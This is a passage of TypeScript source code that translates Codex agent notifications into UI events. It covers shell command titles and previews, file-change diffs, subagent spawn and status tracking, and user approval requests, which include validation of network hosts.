    const rawCommand = codexCommandText(item);
    const command = rawCommand ?? "Shell";
    const status = mapItemStatus(stringField(item, "status"), completed);
    const output =
      stringField(item, "aggregatedOutput") ?? stringField(item, "output");
    const presentation = codexCommandPresentation(item, command);
    const eventType = completed ? "tool.updated" : "tool.started";
    if (eventType === "tool.started") {
      return {
        type: "tool.started",
        callId,
        title: presentation.title,
        kind: "execute",
        status,
        ...(rawCommand ? { command: rawCommand } : {}),
        preview: presentation.preview,
      };
    }
    return {
      type: "tool.updated",
      callId,
      title: presentation.title,
      kind: "execute",
      status,
      ...(output ? { detail: output } : {}),
      ...(rawCommand ? { command: rawCommand } : {}),
      preview: presentation.preview,
    };
  }

  if (itemType === "fileChange") {
    return mapFileChangeItem(item, callId, completed);
  }

  if (itemType === "webSearch") {
    const query = stringField(item, "query") ?? "Search";
    const status = mapItemStatus(stringField(item, "status"), completed);
    if (!completed) {
      return {
        type: "tool.started",
        callId,
        title: composeToolTitle({
          kind: "search",
          title: query,
          query,
          previewKind: "search",
        }),
        kind: "search",
        status,
        preview: { kind: "search", query },
      };
    }
    return {
      type: "tool.updated",
      callId,
      title: composeToolTitle({
        kind: "search",
        title: query,
        query,
        previewKind: "search",
      }),
      kind: "search",
      status,
      preview: { kind: "search", query },
    };
  }

  if (itemType === "mcpToolCall") {
    const server = stringField(item, "server") ?? "mcp";
    const tool = stringField(item, "tool") ?? "tool";
    const title = `${server}:${tool}`;
    const status = mapItemStatus(stringField(item, "status"), completed);
    const args = item.arguments;
    const preview =
      extractToolPreview(
        { kind: "other", title, rawInput: args },
        { kind: "other", title, rawInput: args },
      ) ?? undefined;
    if (!completed) {
      return {
        type: "tool.started",
        callId,
        title,
        kind: "other",
        status,
        preview,
      };
    }
    return {
      type: "tool.updated",
      callId,
      title,
      kind: "other",
      status,
      preview,
    };
  }

  if (itemType === "subAgentActivity") {
    return mapSubAgentActivity(item, callId, completed);
  }

  if (itemType === "collabAgentToolCall") {
    return mapCollabAgentToolCall(item, callId, completed);
  }

  // Unknown item types are ignored; Codex may add new internal kinds over time.
  void item;
  void completed;
  return null;
}

/** Prefer Codex's own best-effort command parsing, then our legacy fallback. */
export function codexCommandPresentation(
  item: Record<string, unknown>,
  command: string,
): { title: string; preview?: ToolPreview } {
  const cwd = stringField(item, "cwd");
  const actions = Array.isArray(item.commandActions)
    ? item.commandActions.flatMap((value) => {
        const action = asRecord(value);
        return action ? [action] : [];
      })
    : [];

  // The last meaningful stage usually describes the pipeline's visible goal
  // (`cat file | grep term` is a Find), while unknown filters are ignored.
  for (let index = actions.length - 1; index >= 0; index -= 1) {
    const action = actions[index];
    const type = stringField(action, "type");
    const path = stringField(action, "path");
    const shownPath = path ? displayPath(path, cwd) : undefined;
    if (type === "search") {
      const query = stringField(action, "query");
      if (!query) continue;
      return {
        title: `Find ${query}`,
        preview: shellCommandPreview(command, path, query),
      };
    }
    if (type === "read" && path) {
      return {
        title: `Read ${shownPath}`,
        preview: shellCommandPreview(command, path),
      };
    }
    if (type === "listFiles") {
      // The reported "Shell" row: a path-less listing (`rg --files -g AGENTS.md`)
      // made this derive a bare "List", and `composeToolTitle` collapses that
      // weak title to "Shell" because no path is left to show. Fall through so
      // the command itself — or the intent inferred from it — becomes the label.
      if (!shownPath) continue;
      return {
        title: `List ${shownPath}`,
        preview: shellCommandPreview(command, path),
      };
    }
  }

  const inferred = inferShellIntent(command);
  if (inferred) {
    const path = inferred.path;
    const shownPath = path ? displayPath(path, cwd) : undefined;
    const title = formatShellIntent(inferred, shownPath, inferred.query);
    if (title) {
      return {
        title,
        preview: shellCommandPreview(
          command,
          path,
          inferred.query,
          inferred.startLine,
        ),
      };
    }
  }
  // `ls` with no path derives a bare "List", which the activity stack treats as
  // an empty placeholder. The command itself is the honest label.
  return {
    title: command,
    preview: shellCommandPreview(command),
  };
}

function shellCommandPreview(
  command: string,
  path?: string,
  query?: string,
  startLine?: number,
): ToolPreview {
  return {
    kind: "shell",
    title: command,
    ...(path
      ? {
          path,
          fileName: path
            .replace(/[/\\]+$/, "")
            .split(/[/\\]/)
            .pop(),
        }
      : {}),
    ...(query ? { query } : {}),
    ...(startLine ? { startLine } : {}),
  };
}

function mapSubAgentActivity(
  item: Record<string, unknown>,
  callId: string,
  completed: boolean,
): HarnessEvent {
  const kind = (stringField(item, "kind") ?? "").toLowerCase();
  const path =
    stringField(item, "agentPath") ?? stringField(item, "agent_path");
  const leaf = path?.split(/[/\\]/).filter(Boolean).pop();
  const title = leaf ? `${formatAgentType(leaf)} subagent` : "Subagent";
  if (kind === "interrupted") {
    return {
      type: "tool.updated",
      callId,
      title,
      kind: "agent",
      status: "failed",
      detail: "Subagent interrupted.",
    };
  }
  if (kind === "interacted") {
    return {
      type: completed ? "tool.updated" : "tool.started",
      callId,
      title,
      kind: "agent",
      status: "in_progress",
    };
  }
  // `started` items are completion-only in app-server v2: the spawn finished,
  // but the child agent is still running.
  return {
    type: "tool.started",
    callId,
    title,
    kind: "agent",
    status: "in_progress",
  };
}

/** Current app-server v2 representation for spawn/send/wait/close calls. */
function mapCollabAgentToolCall(
  item: Record<string, unknown>,
  callId: string,
  completed: boolean,
): HarnessEvent {
  const tool = stringField(item, "tool") ?? "";
  const rawReceivers = item.receiverThreadIds ?? item.receiver_thread_ids;
  const receivers = Array.isArray(rawReceivers)
    ? rawReceivers.filter(
        (value): value is string => typeof value === "string" && !!value,
      )
    : [];
  const fallbackTitle =
    tool === "spawnAgent"
      ? "Spawn subagent"
      : tool === "sendInput"
        ? "Message subagent"
        : tool === "resumeAgent"
          ? "Resume subagent"
          : tool === "wait"
            ? receivers.length > 1
              ? `Wait for ${receivers.length} subagents`
              : "Wait for subagent"
            : tool === "closeAgent"
              ? "Close subagent"
              : "Subagent";
  // A spawn's brief is the only name the agent gets. Its first line is what
  // the model wrote the run for, so "Spawn subagent" is a last resort.
  const brief = agentBrief(item);
  const title = tool === "spawnAgent" && brief ? brief : fallbackTitle;
  const detail = collabAgentFailureDetail(item);
  const failed = stringField(item, "status") === "failed" || !!detail;
  // Spawning or resuming an agent is that agent's row. Waiting on one,
  // messaging it and closing it are bookkeeping against a row that already
  // exists — given their own agent rows they read as extra subagents that
  // never do anything.
  const spawns = tool === "spawnAgent" || tool === "resumeAgent";
  // Completing a spawn means the call returned, not that the agent it started
  // has finished — the child runs on its own thread for as long as it needs.
  // Only its reported state settles the row, so a running agent is never
  // captioned as done.
  const settled = completed && (!spawns || failed);
  return {
    type: completed ? "tool.updated" : "tool.started",
    callId,
    title,
    kind: spawns ? "agent" : "other",
    ...(spawns && stringField(item, "model")
      ? { agentModel: stringField(item, "model") }
      : {}),
    status: settled ? (failed ? "failed" : "completed") : "in_progress",
    ...(detail ? { detail } : {}),
  };
}

const TERMINAL_AGENT_STATES = new Set([
  "completed",
  "complete",
  "done",
  "finished",
  "errored",
  "error",
  "failed",
  "notfound",
  "not_found",
  "closed",
  "interrupted",
  "stopped",
  "cancelled",
  "canceled",
]);

const FAILED_AGENT_STATES = new Set([
  "errored",
  "error",
  "failed",
  "notfound",
  "not_found",
  "interrupted",
]);

/**
 * Per-agent state a collab item reports, keyed by child thread. This is what
 * actually settles a spawned agent's row: the spawn call returns long before
 * the agent it started is finished.
 */
export function codexSubagentStates(
  item: Record<string, unknown>,
): Array<{ threadId: string; status: string; message?: string }> {
  const states = asRecord(item.agentsStates) ?? asRecord(item.agents_states);
  return Object.entries(states ?? {}).flatMap(([threadId, value]) => {
    const state = asRecord(value);
    const status = (stringField(state, "status") ?? "").toLowerCase();
    if (!threadId || !TERMINAL_AGENT_STATES.has(status)) return [];
    const message = stringField(state, "message")?.trim();
    return [
      {
        threadId,
        status: FAILED_AGENT_STATES.has(status) ? "failed" : "completed",
        ...(message ? { message } : {}),
      },
    ];
  });
}

/**
 * Thread ids a collab item ties to an agent row, so the child thread's own
 * notifications can be mirrored back onto it. Codex runs each subagent as a
 * separate thread on the same connection.
 */
export function codexSubagentThreadIds(
  item: Record<string, unknown>,
): string[] {
  const ids = new Set<string>();
  for (const key of ["agentThreadId", "agent_thread_id"]) {
    const value = stringField(item, key);
    if (value) ids.add(value);
  }
  const receivers = item.receiverThreadIds ?? item.receiver_thread_ids;
  if (Array.isArray(receivers)) {
    for (const value of receivers) {
      if (typeof value === "string" && value) ids.add(value);
    }
  }
  const states = asRecord(item.agentsStates) ?? asRecord(item.agents_states);
  for (const key of Object.keys(states ?? {})) {
    if (key) ids.add(key);
  }
  return [...ids];
}

/**
 * A child thread's own notification, mirrored onto the agent row that spawned
 * it. Only settled items are mirrored: the deltas that stream inside a child
 * thread carry no item identity, so they cannot be merged onto a step without
 * stacking the same sentence up again on every chunk.
 */
export function mapCodexSubagentSteps(
  callId: string,
  method: string,
  params: unknown,
): HarnessEvent[] {
  if (method === "thread/started") {
    const model = stringField(asRecord(asRecord(params)?.thread), "model");
    return model
      ? [{ type: "tool.updated", callId, kind: "agent", agentModel: model }]
      : [];
  }
  if (method !== "item/started" && method !== "item/completed") return [];
  const rec = asRecord(params);
  const item = asRecord(rec?.item);
  const itemId = stringField(item, "id");
  if (!rec || !itemId) return [];
  return mapCodexNotification(method, params).events.flatMap(
    (event): HarnessEvent[] => {
      if (event.type === "tool.started" || event.type === "tool.updated") {
        // Only a failure earns detail: a settled result already rides in the
        // preview, and a long one would weigh the run down for nothing.
        const detail =
          event.type === "tool.updated" && event.status === "failed"
            ? event.detail
            : undefined;
        return [
          {
            type: "agent.step",
            callId,
            stepId: event.callId,
            kind: "tool",
            text: event.title ?? "",
            ...(event.kind ? { toolKind: event.kind } : {}),
            ...(event.status ? { status: event.status } : {}),
            ...(detail ? { detail } : {}),
            ...(event.preview ? { preview: event.preview } : {}),
          },
        ];
      }
      if (event.type === "message.delta") {
        return [
          {
            type: "agent.step",
            callId,
            stepId: `${itemId}:text`,
            kind: "message",
            text: event.text,
          },
        ];
      }
      if (event.type === "reasoning.delta") {
        return [
          {
            type: "agent.step",
            callId,
            stepId: `${itemId}:reasoning`,
            kind: "reasoning",
            text: event.text,
          },
        ];
      }
      return [];
    },
  );
}

/** The first line of a spawn's prompt, short enough to sit on a row. */
function agentBrief(item: Record<string, unknown>): string | undefined {
  const path =
    stringField(item, "agentPath") ?? stringField(item, "agent_path");
  const leaf = path?.split(/[/\\]/).filter(Boolean).pop();
  if (leaf) return `${formatAgentType(leaf)} subagent`;
  const prompt = stringField(item, "prompt");
  const line = prompt
    ?.split("\n")
    .map((part) => part.trim())
    .find(Boolean);
  if (!line) return undefined;
  return line.length <= 160 ? line : `${line.slice(0, 159)}\u2026`;
}

function collabAgentFailureDetail(
  item: Record<string, unknown>,
): string | undefined {
  const states = asRecord(item.agentsStates) ?? asRecord(item.agents_states);
  const errors = Object.values(states ?? {}).flatMap((value) => {
    const state = asRecord(value);
    const status = (stringField(state, "status") ?? "").toLowerCase();
    if (
      status !== "errored" &&
      status !== "notfound" &&
      status !== "not_found"
    ) {
      return [];
    }
    return [stringField(state, "message") ?? "Subagent failed."];
  });
  if (errors.length > 0) return [...new Set(errors)].join("\n");
  return stringField(item, "status") === "failed"
    ? "Subagent operation failed."
    : undefined;
}

function mapFileChangeItem(
  item: Record<string, unknown>,
  callId: string,
  completed: boolean,
): HarnessEvent {
  const changes = Array.isArray(item.changes) ? item.changes : [];
  const paths = changes
    .map((change) => stringField(asRecord(change), "path"))
    .filter((path): path is string => Boolean(path));
  const first = asRecord(changes[0]);
  const path = stringField(first, "path");
  const diff = stringField(first, "diff");
  const status = mapItemStatus(stringField(item, "status"), completed);
  const preview = buildDiffPreview(path, diff);
  const title =
    composeToolTitle({
      kind: "edit",
      title: path ? `Edit ${path}` : "Edit",
      path,
      previewKind: "write",
    }) || "Edit";
  if (!completed) {
    return {
      type: "tool.started",
      callId,
      title,
      kind: "edit",
      status,
      preview,
      ...(paths.length ? { paths } : {}),
    };
  }
  return {
    type: "tool.updated",
    callId,
    title,
    kind: "edit",
    status,
    preview,
    ...(paths.length ? { paths } : {}),
  };
}

function mapFileChangePatch(
  rec: Record<string, unknown>,
): MappedCodexNotification {
  const itemId = stringField(rec, "itemId") ?? "";
  if (!itemId) return { events: [] };
  const changes = Array.isArray(rec.changes) ? rec.changes : [];
  const paths = changes
    .map((change) => stringField(asRecord(change), "path"))
    .filter((path): path is string => Boolean(path));
  const first = asRecord(changes[0]);
  const path = stringField(first, "path");
  const diff = stringField(first, "diff") ?? stringField(rec, "diff");
  const preview = buildDiffPreview(path, diff);
  const title =
    composeToolTitle({
      kind: "edit",
      title: path ? `Edit ${path}` : "Edit",
      path,
      previewKind: "write",
    }) || "Edit";
  return {
    events: [
      {
        type: "tool.updated",
        callId: itemId,
        title,
        kind: "edit",
        status: "in_progress",
        preview,
        ...(paths.length ? { paths } : {}),
      },
    ],
  };
}

function buildDiffPreview(
  path: string | undefined,
  diff: string | undefined,
): ToolPreview | undefined {
  if (!path && !diff) return undefined;
  const fake = {
    kind: "edit",
    title: path ? `Edit ${path}` : "Edit",
    content: diff
      ? [{ type: "diff", path, patch: diff }]
      : path
        ? [{ type: "diff", path }]
        : undefined,
    locations: path ? [{ path }] : undefined,
  };
  return (
    extractToolPreview(fake, fake) ??
    (path
      ? { kind: "write", path, fileName: path.split(/[/\\]/).pop() }
      : undefined)
  );
}

function mapItemStatus(status: string | undefined, completed: boolean): string {
  if (status === "completed" || status === "failed" || status === "declined") {
    // A declined call never ran: it reads as cancelled, not failed (Mac 1.11).
    return status === "declined" ? "cancelled" : status;
  }
  if (status === "inProgress") return "in_progress";
  return completed ? "completed" : "in_progress";
}

/**
 * True when an approval request asks for nothing beyond running one command
 * or applying one patch. Codex uses the same two requests to ask for more: a
 * retry outside the sandbox or an escalation the model wants, network access
 * to a host, input for a running terminal, or write access under a new root.
 *
 * For a command this is a hint only. An escalation whose model gave no
 * justification carries no `reason` and looks plain (Codex 0.161.0). An
 * "always allow" rule therefore never accepts a command; see
 * `commandsAlwaysPolicy`. It skips only a plain patch inside the chat's
 * folders.
 */
export function isPlainCodexApproval(method: string, params: unknown): boolean {
  const rec = asRecord(params);
  if (!rec || stringField(rec, "reason")) return false;
  if (method === "item/commandExecution/requestApproval") {
    const kind = stringField(rec, "kind");
    return (
      (!kind || kind === "command") &&
      rec.networkApprovalContext == null &&
      rec.additionalPermissions == null
    );
  }
  if (method === "item/fileChange/requestApproval") {
    return rec.grantRoot == null;
  }
  return false;
}

export function mapApprovalRequest(
  method: string,
  params: unknown,
  requestId: number,
): {
  kind: CodexApprovalKind;
  event: Extract<HarnessEvent, { type: "approval.requested" }>;
} | null {
  const rec = asRecord(params);
  if (!rec) return null;

  if (method === "item/commandExecution/requestApproval") {
    const command = codexCommandText(rec) ?? "Shell";
    const callId = stringField(rec, "itemId");
    const reason = stringField(rec, "reason");
    const presentation = codexCommandPresentation(rec, command);
    const readable = presentation.title !== command;
    // Network access to a host: show the host and protocol, and the standing
    // host rules Codex proposed. All of it is untrusted text, so it is kept
    // only when it looks like a host and a known protocol.
    const networkRec = asRecord(rec.networkApprovalContext);
    const networkHost = networkRec
      ? codexApprovalHost_l5(networkRec.host)
      : undefined;
    const networkProtocol = networkRec
      ? codexApprovalProtocol_l5(networkRec.protocol)
      : undefined;
    const amendments = Array.isArray(rec.proposedNetworkPolicyAmendments)
      ? rec.proposedNetworkPolicyAmendments
          .slice(0, 8)
          .flatMap((item): { host: string; action: "allow" | "deny" }[] => {
            const entry = asRecord(item);
            const host = entry ? codexApprovalHost_l5(entry.host) : undefined;
            const action = entry?.action;
            return host && (action === "allow" || action === "deny")
              ? [{ host, action }]
              : [];
          })
      : [];
    const network =
      networkHost && networkProtocol
        ? {
            host: networkHost,
            protocol: networkProtocol,
            ...(amendments.length > 0 ? { amendments } : {}),
          }
        : undefined;
    return {
      kind: "command",
      event: {
        type: "approval.requested",
        requestId,
        title: readable
          ? presentation.title
          : reason
            ? `${command} — ${reason}`
            : command,
        kind: "execute",
        callId,
        preview: presentation.preview,
        tool: { key: CODEX_COMMAND_TOOL, label: toolLabel(CODEX_COMMAND_TOOL) },
        ...(network ? { network } : {}),
      },
    };
  }

  if (method === "item/fileChange/requestApproval") {
    const callId = stringField(rec, "itemId");
    const reason = stringField(rec, "reason");
    const title = reason ?? "Approve file changes";
    return {
      kind: "file-change",
      event: {
        type: "approval.requested",
        requestId,
        title,
        kind: "edit",
        callId,
        tool: {
          key: CODEX_FILE_CHANGE_TOOL,
          label: toolLabel(CODEX_FILE_CHANGE_TOOL),
        },
      },
    };
  }

  // A sandbox escalation names no tool on purpose: per-chat tool rules never
  // answer it. It keeps following the permission mode.
  if (method === "item/permissions/requestApproval") {
    const callId = stringField(rec, "itemId");
    const reason = stringField(rec, "reason") ?? "Approve permissions";
    return {
      kind: "permissions",
      event: {
        type: "approval.requested",
        requestId,
        title: reason,
        kind: "other",
        callId,
      },
    };
  }

  return null;
}
/** A host from a network approval: bounded, host characters only. */
function codexApprovalHost_l5(value: unknown): string | undefined {
  if (typeof value !== "string") return undefined;
  const host = value.trim();
  if (!host || host.length > 253) return undefined;
  return /^[A-Za-z0-9.\-:[\]*]+$/.test(host) ? host : undefined;
}

function codexApprovalProtocol_l5(value: unknown): string | undefined {
  return value === "http" ||
    value === "https" ||
    value === "socks5Tcp" ||
    value === "socks5Udp"
    ? value
    : undefined;
}

/** A Codex config key: letters, digits, `.`, `_`, `-`, at most 64 long. */
function isCodexConfigId_l5(value: unknown): value is string {
  return (
    typeof value === "string" &&
    value.length <= 64 &&
    /^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(value)
  );
}
